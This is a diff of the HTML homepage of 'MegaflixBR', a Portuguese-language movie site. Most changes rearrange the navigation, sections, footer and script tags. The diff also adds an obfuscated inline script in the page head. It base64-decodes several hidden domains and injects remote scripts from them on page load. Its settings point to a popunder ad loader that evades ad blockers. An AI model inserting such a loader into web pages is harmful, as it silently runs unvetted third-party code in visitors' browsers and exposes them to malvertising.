@@ -5,34 +5,24 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MegaflixBR</title>
-    <!-- Link Swiper CSS -->
     <link rel="stylesheet" href="assets/css/swiper-bundle.min.css">
-    <!-- Link css -->
     <link rel="stylesheet" href="assets/css/style.css">
-    <!-- Fav Icon -->
     <link rel="shortcut icon" href="assets/img/fav-icon.png" type="image/x-icon">
-    <!-- Box Icons -->
     <link rel="stylesheet" href="https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css">
+
+    <script type="text/javascript" data-cfasync="false">
+        /*<![CDATA[/* */
+        (function(){var p=window,f="f8bb9be02ab6a37832d4feb6e1cbf043",v=[["siteId",745+295*578+808+383+4919854],["minBid",0.001],["popundersPerIP","1:1,1:1"],["delayBetween",30],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],x=["d3d3LmJsb2NrYWRzbm90LmNvbS9LY3doSy9iY29yZS5taW4uanM=","ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC9FVGYvUnl5eS92anN6aXAubWluLmNzcw==","d3d3LnRqZWhzemZ0cnUuY29tL292L3hjb3JlLm1pbi5qcw==","d3d3LmFnbmVnenBtYnQuY29tL3p1SS9TL25qc3ppcC5taW4uY3Nz"],t=-1,m,y,u=function(){clearTimeout(y);t++;if(x[t]&&!(1739237203000<(new Date).getTime()&&1<t)){m=p.document.createElement("script");m.type="text/javascript";m.async=!0;var r=p.document.getElementsByTagName("script")[0];m.src="https://"+atob(x[t]);m.crossOrigin="anonymous";m.onerror=u;m.onload=function(){clearTimeout(y);p[f.slice(0,16)+f.slice(0,16)]||u()};y=setTimeout(u,5E3);r.parentNode.insertBefore(m,r)}};if(!p[f]){try{Object.freeze(p[f]=v)}catch(e){}u()}})();
+        /*]]>/* */
+        </script>
 </head>
 
 <body>
     <header>
         <div class="nav container">
-            <!-- Inicio Logo -->
             <a href="index.html" class="logo">
                 Megaflix<span>BR</span>
             </a>
-            <!-- Fim Logo -->
-            <!-- Inicio Buscar -->
-            <div class="search">
-                <input type="search" id="search" placeholder="Buscar">
-                <i class="bx bx-search"></i>
-            </div>
-            <!-- Fim Buscar -->
-            <a href="#" class="user">
-                <img src="assets/img/user.png" alt="" class="user-img">
-            </a>
-            <!-- Inicio Navbar -->
             <div class="navbar">
                 <a href="#home" class="nav-link nav-active">
                     <i class="bx bx-home"></i>
@@ -42,71 +32,49 @@
                     <i class="bx bxs-hot"></i>
                     <span class="nav-link-title">Em Alta</span>
                 </a>
-                <a href="#" class="nav-link">
-                    <i class="bx bx-compass"></i>
-                    <span class="nav-link-title">Explorar</span>
-                </a>
                 <a href="play-page.html" class="nav-link">
                     <i class="bx bx-tv"></i>
                     <span class="nav-link-title">Filmes</span>
+                </a>
+                <a href="#" class="nav-link">
+                    <i class="bx bx-compass"></i>
+                    <span class="nav-link-title">Explorar</span>
                 </a>
                 <a href="#" class="nav-link">
                     <i class="bx bx-heart"></i>
                     <span class="nav-link-title">Favoritos</span>
                 </a>
             </div>
-            <!-- Fim Navbar -->
+            <div class="search">
+                <input type="search" id="search" placeholder="Buscar">
+                <i class="bx bx-search"></i>
+            </div>
         </div>
     </header>
-    <!-- Inicio Banner Destaque -->
-    <section class="home container" id="home">
-        <img src="assets/img/home-background.png" alt="" class="home-img">
-        <div class="home-text">
-            <h1 class="home--title">O Guarda-Costas <br>e a Mulher do Assassino</h1>
-            <p>Lançamento 10 de Abril</p>
-            <a href="#" class="watch-btn">
-                <i class="bx bx-right-arrow"></i>
-                <span>Veja o Trailer</span>
-            </a>
-        </div>
-    </section>
-    <!-- Fim Banner Destaque -->
-    <!-- Inicio Em Alta Section  -->
-    <section class="popular container" id="popular">
-        <div class="heading">
-            <h2 class="heading-title">Em Alta</h2>
-            <div class="swiper-btn">
-                <div class="swiper-button-prev"></div>
-                <div class="swiper-button-next"></div>
+    <main>
+        <section class="fundo " id="home">
+        </section>
+        <section class="popular container" id="popular">
+            <div class="heading">
+                <h2 class="heading-title">Em Alta</h2>
+                <div class="swiper-btn">
+                    <div class="swiper-button-prev"></div>
+                    <div class="swiper-button-next"></div>
 
+                </div>
             </div>
-        </div>
-        <div class="popular-content swiper-container">
-            <div id="emAlta" class="swiper-wrapper">
-                <!-- <div class="swiper-slide">
-                    <div class="filmeBox">
-                        <img src="img/popular-movie-1.jpg" alt="" class="filme-box-img">
-                        <div class="box-text">
-                            <h2 class="filme-title">Homem-Aranha: Sem Volta para Casa</h2>
-                            <span class="filme-class">Ação</span>
-                            <a href="#" class="watch-btn play-btn">
-                                <i class="bx bx-right-arrow"></i>
-                            </a>
-                        </div>
-                    </div>
-                </div> -->
-            </div>
-        </div>
-    </section>
-    <!-- Fim Em Alta Section  -->
+            <div class="popular-content swiper-container">
+                <div id="emAlta" class="swiper-wrapper">
 
-    <!-- Inicio Filmes Section  -->
-    <section class="filmes container" id="filmes">
-        <div class="heading">
-            <h2 class="heading-title">Filmes</h2>
-        </div>
-        <!-- Filmes Content -->
-        <!-- <div class="filmes-content">
+                </div>
+            </div>
+        </section>
+        <section class="filmes container" id="filmes">
+            <div class="heading">
+                <h2 class="heading-title">Filmes</h2>
+            </div>
+            <!-- Filmes Content -->
+            <!-- <div class="filmes-content">
             <div class="filmeBox">
                 <img src="img/movie-1.jpg" alt="" class="filme-box-img">
                 <div class="box-text">
@@ -188,17 +156,23 @@
                 </div>
             </div>
         </div> -->
-    </section>
-    <!-- Fim Filmes Section  -->
-    <!-- Inicio Proxima Página -->
-    <div class="next-page">
-        <a href="#" class="next-btn">Proxima Página</a>
-    </div>
+        </section>
+        <!-- Fim Filmes Section  -->
+        <!-- Inicio Proxima Página -->
+        <div class="next-page">
+            <a href="test.html" class="next-btn">Proxima Página</a>
+        </div>
+
+
+    </main>
     <!-- FimProxima Página -->
     <!-- Copyright -->
-    <div class="copyright">
-        <p>&#169; Todos os direitos reservados a Pablo Silva.</p>
-    </div>
+    <footer>
+
+        <div class="copyright">
+            <p>&#169; Todos os direitos reservados a MegaflixBR.</p>
+        </div>
+    </footer>
     <!-- FimCopyright -->
 
 
@@ -209,10 +183,11 @@
 
     <!-- Link Js -->
     <script src="assets/js/swiper-bundle.min.js"></script>
-    <script src="assets/js/script.js"></script>
 
     <!-- Link Api js -->
     <script src="assets/js/main.js" type="module"></script>
+    <script src="assets/js/script.js"></script>
+    <script src="assets/js/filmes.js" type="module"></script>
 </body>
 
 </html>
